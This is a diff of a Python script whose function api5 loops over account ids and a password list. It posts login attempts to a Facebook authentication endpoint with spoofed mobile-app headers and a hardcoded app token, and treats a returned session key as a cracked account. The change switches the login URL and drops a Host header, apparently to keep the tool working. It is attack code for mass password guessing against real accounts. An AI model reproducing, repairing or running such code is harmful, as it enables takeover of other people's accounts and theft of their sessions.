@@ -504,8 +504,7 @@ def api5(ids,names,passlist):
                                         'x-fb-sim-hni':'45201',
                                         'x-fb-connection-type':'MOBILE.LTE',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua,
-                                        'Host': 'graph.facebook.com', 
+                                        'user-agent':ua,                                        
                                         'x-fb-net-hni':'45204',
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
@@ -516,7 +515,7 @@ def api5(ids,names,passlist):
                                         'accept-encoding':'gzip, deflate',
                                         'X-FB-Request-Analytics-Tags': 'graphservice',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-api.facebook.com/method/auth/login'
+                                url =   'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
